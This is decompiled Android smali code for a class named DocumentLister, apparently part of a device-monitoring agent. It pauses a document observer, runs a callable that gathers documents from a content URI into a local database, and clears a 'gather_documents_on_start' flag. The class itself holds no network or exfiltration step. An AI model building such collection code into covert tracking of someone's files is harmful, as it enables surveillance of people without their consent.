.class public Lcom/hp/vd/module/monitor/document/DocumentLister;
.super Ljava/lang/Object;
.source "DocumentLister.java"

# interfaces
.implements Ljava/lang/Runnable;


# static fields
.field protected static final TAG:Ljava/lang/String; = "DocumentLister"


# instance fields
.field protected contentResolver:Landroid/content/ContentResolver;

.field protected contentUri:Landroid/net/Uri;

.field protected dao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/DocumentData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected documentObserver:Lcom/hp/vd/module/monitor/document/DocumentObserver;

.field protected log:Lcom/hp/vd/agent/log/IWriter;

.field protected moduleDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected moduleData:Lcom/hp/vd/data/ModuleData;


# direct methods
.method public constructor <init>(Landroid/content/ContentResolver;Landroid/net/Uri;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/module/monitor/document/DocumentObserver;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "(",
            "Landroid/content/ContentResolver;",
            "Landroid/net/Uri;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/DocumentData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/data/ModuleData;",
            "Lcom/hp/vd/module/monitor/document/DocumentObserver;",
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/ModuleData;",
            "Ljava/lang/Integer;",
            ">;",
            "Lcom/hp/vd/agent/log/IWriter;",
            ")V"
        }
    .end annotation

    .line 35
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    const/4 v0, 0x0

    .line 19
    iput-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->contentResolver:Landroid/content/ContentResolver;

    .line 20
    iput-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->contentUri:Landroid/net/Uri;

    .line 21
    iput-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 22
    iput-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 23
    iput-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->documentObserver:Lcom/hp/vd/module/monitor/document/DocumentObserver;

    .line 24
    iput-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 25
    iput-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->log:Lcom/hp/vd/agent/log/IWriter;

    .line 36
    iput-object p1, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->contentResolver:Landroid/content/ContentResolver;

    .line 37
    iput-object p2, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->contentUri:Landroid/net/Uri;

    .line 38
    iput-object p3, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->dao:Lcom/j256/ormlite/dao/Dao;

    .line 39
    iput-object p4, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 40
    iput-object p5, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->documentObserver:Lcom/hp/vd/module/monitor/document/DocumentObserver;

    .line 41
    iput-object p6, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    .line 42
    iput-object p7, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->log:Lcom/hp/vd/agent/log/IWriter;

    return-void
.end method


# virtual methods
.method public run()V
    .locals 9

    .line 47
    iget-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->documentObserver:Lcom/hp/vd/module/monitor/document/DocumentObserver;

    invoke-virtual {v0}, Lcom/hp/vd/module/monitor/document/DocumentObserver;->deactivate()Z

    .line 49
    new-instance v0, Lcom/hp/vd/module/monitor/document/DocumentCallable;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->contentResolver:Landroid/content/ContentResolver;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->contentUri:Landroid/net/Uri;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->dao:Lcom/j256/ormlite/dao/Dao;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    iget-object v6, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->documentObserver:Lcom/hp/vd/module/monitor/document/DocumentObserver;

    iget-object v7, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v8, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->log:Lcom/hp/vd/agent/log/IWriter;

    move-object v1, v0

    invoke-direct/range {v1 .. v8}, Lcom/hp/vd/module/monitor/document/DocumentCallable;-><init>(Landroid/content/ContentResolver;Landroid/net/Uri;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/data/ModuleData;Lcom/hp/vd/module/monitor/document/DocumentObserver;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    .line 60
    :try_start_0
    invoke-interface {v0}, Ljava/util/concurrent/Callable;->call()Ljava/lang/Object;

    .line 62
    iget-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v1, "gather_documents_on_start"

    const-string v2, "false"

    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    .line 63
    iget-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->moduleDao:Lcom/j256/ormlite/dao/Dao;

    iget-object v1, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->moduleData:Lcom/hp/vd/data/ModuleData;

    invoke-interface {v0, v1}, Lcom/j256/ormlite/dao/Dao;->update(Ljava/lang/Object;)I

    .line 65
    iget-object v0, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->documentObserver:Lcom/hp/vd/module/monitor/document/DocumentObserver;

    invoke-virtual {v0}, Lcom/hp/vd/module/monitor/document/DocumentObserver;->activate()Z
    :try_end_0
    .catch Ljava/sql/SQLException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-void

    :catch_0
    move-exception v0

    .line 73
    iget-object v1, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "DocumentLister"

    const-string v3, "Exception caught durring callable.call()."

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void

    :catch_1
    move-exception v0

    .line 68
    iget-object v1, p0, Lcom/hp/vd/module/monitor/document/DocumentLister;->log:Lcom/hp/vd/agent/log/IWriter;

    const-string v2, "DocumentLister"

    const-string v3, "run(): Exception caught during executing Callable."

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return-void
.end method
